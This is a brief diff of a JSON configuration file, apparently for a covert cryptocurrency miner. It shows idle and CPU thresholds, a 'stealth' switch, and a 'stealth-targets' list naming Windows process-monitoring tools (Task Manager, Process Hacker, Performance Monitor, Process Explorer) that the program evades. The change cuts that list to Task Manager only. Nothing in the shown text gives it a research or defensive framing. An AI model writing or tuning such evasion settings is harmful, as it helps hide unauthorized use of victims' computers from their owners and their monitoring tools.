@@ -11,5 +11,5 @@
 	"idle-wait": 2,
 	"idle-cpu": 100,
 	"stealth": true,
-	"stealth-targets": "Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe"
+	"stealth-targets": "Taskmgr.exe"
 }
